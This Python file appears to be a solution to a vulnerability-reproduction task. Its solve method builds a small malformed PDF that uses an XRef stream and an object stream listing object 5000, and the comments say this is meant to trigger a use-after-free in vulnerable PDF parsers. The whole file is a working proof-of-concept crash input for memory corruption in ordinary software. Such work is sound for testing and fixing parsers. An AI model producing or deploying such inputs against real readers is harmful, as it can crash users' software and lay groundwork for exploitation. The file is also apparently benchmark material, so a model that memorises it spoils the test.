import struct
import zlib
from typing import List


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a compact PDF that:
        # - Uses an XRef stream
        # - Marks object 2 as compressed in object stream 3
        # - Object stream 3 contains object numbers 2 and 5000
        # - Loading object 2 triggers loading object stream 3; parsing the object stream
        #   forces creation/resizing of xref entries for object 5000, which can trigger
        #   the UAF in vulnerable implementations.

        def pack_xref_entry(entry_type: int, field1: int, field2: int) -> bytes:
            # /W [1 4 2]
            return bytes((entry_type & 0xFF,)) + int(field1).to_bytes(4, "big", signed=False) + int(field2).to_bytes(2, "big", signed=False)

        header = b"%PDF-1.7\n%\xD0\xD4\xC5\xD8\n"

        # Object 1: Catalog
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"

        # Object 5: Page (uncompressed)
        obj5 = (
            b"5 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 6 0 R /Resources << >> >>\n"
            b"endobj\n"
        )

        # Object 6: Contents stream (empty)
        obj6 = b"6 0 obj\n<< /Length 0 >>\nstream\nendstream\nendobj\n"

        # Object 2: Pages dictionary (to be stored inside object stream 3)
        obj2_in_objstm = b"<< /Type /Pages /Kids [5 0 R] /Count 1 >>\n"

        # Second embedded object in object stream: large object number to force xref growth
        obj5000_in_objstm = b"null\n"

        offset_5000 = len(obj2_in_objstm)
        objstm_table = f"2 0 5000 {offset_5000}\n".encode("ascii")
        objstm_first = len(objstm_table)
        objstm_data = objstm_table + obj2_in_objstm + obj5000_in_objstm
        objstm_len = len(objstm_data)

        # Object 3: Object stream containing objects 2 and 5000
        obj3 = (
            b"3 0 obj\n"
            + f"<< /Type /ObjStm /N 2 /First {objstm_first} /Length {objstm_len} >>\n".encode("ascii")
            + b"stream\n"
            + objstm_data
            + b"endstream\nendobj\n"
        )

        parts: List[bytes] = [header]
        offset1 = sum(len(p) for p in parts)
        parts.append(obj1)

        offset5 = sum(len(p) for p in parts)
        parts.append(obj5)

        offset6 = sum(len(p) for p in parts)
        parts.append(obj6)

        offset3 = sum(len(p) for p in parts)
        parts.append(obj3)

        # XRef stream (object 4)
        offset4 = sum(len(p) for p in parts)

        # /Size is the highest object number + 1 among explicitly xref'd objects here
        # (0..6). The object stream will introduce object 5000 during parsing.
        size = 7

        xref_entries = [
            pack_xref_entry(0, 0, 65535),          # 0 free
            pack_xref_entry(1, offset1, 0),        # 1 in file
            pack_xref_entry(2, 3, 0),              # 2 in object stream 3, index 0
            pack_xref_entry(1, offset3, 0),        # 3 in file
            pack_xref_entry(1, offset4, 0),        # 4 in file (xref stream itself)
            pack_xref_entry(1, offset5, 0),        # 5 in file
            pack_xref_entry(1, offset6, 0),        # 6 in file
        ]
        xref_data = b"".join(xref_entries)
        xref_len = len(xref_data)

        obj4 = (
            b"4 0 obj\n"
            + f"<< /Type /XRef /Size {size} /W [1 4 2] /Index [0 {size}] /Root 1 0 R /Length {xref_len} >>\n".encode("ascii")
            + b"stream\n"
            + xref_data
            + b"\nendstream\nendobj\n"
        )
        parts.append(obj4)

        trailer = b"startxref\n" + str(offset4).encode("ascii") + b"\n%%EOF\n"
        parts.append(trailer)

        return b"".join(parts)